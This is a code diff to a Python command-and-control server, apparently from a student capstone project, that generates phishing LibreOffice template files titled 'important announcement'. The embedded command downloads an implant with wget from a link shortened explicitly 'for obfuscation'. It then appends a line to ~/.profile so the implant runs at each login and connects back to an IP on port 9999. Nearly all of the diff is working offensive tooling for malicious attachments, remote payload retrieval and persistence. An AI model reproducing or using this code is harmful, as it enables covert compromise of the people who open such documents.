@@ -3,7 +3,14 @@ import socket
 
 app = Celery('c2_server', broker='redis://redis:6379/0', backend='redis://redis:6379/0')
 
-IMPLANT_ADDR = "https://github.com/d1lacy/LibreOfficeCapstone/raw/refs/heads/main/mock_implant.py"
+original_implant_addr = "https://github.com/d1lacy/LibreOfficeCapstone/raw/refs/heads/main/libutils-amd64"
+
+
+# shortened for obfuscation
+IMPLANT_ADDR = "https://tinyurl.com/ycxssc7p"\
+
+PORT = 9999
+
 
 @app.task
 def execute_command(target, command):
@@ -27,19 +34,20 @@ def get_public_ip():
         return None
 
 
-def generate_implant_command(ip, fingerprint, implant_addr):
-    get_implant = f"wget -O ~/libutils.py {implant_addr}"
-    run_implant_command = f"echo 'python3 ~/libutils.py {ip} {fingerprint} >/dev/null 2>/dev/null' >> ~/.profile"
+def generate_implant_command(ip, implant_addr):
+    get_implant = f"wget -O ~/libutils {implant_addr}"
+    add_permissions = "chmod +x ~/libutils"
+    run_implant_command = f"echo '~/libutils {ip} {PORT} >/dev/null 2>/dev/null' >> ~/.profile"
     command = f"{get_implant} ; {run_implant_command}" 
     return command
 
 
 def generate_attachment(command, fingerprint):
-    with open("implants/template.fdot", "r") as f:
+    with open("attachments/template.fdot", "r") as f:
         template = f.read()
     
     implant = template.replace("**COMMAND**", command)
-    outpath = f"implants/important_announcement_{fingerprint}.fdot"
+    outpath = f"attachments/important_announcement_{fingerprint}.fdot"
     with open(outpath, "w") as f:
         f.write(implant)
 
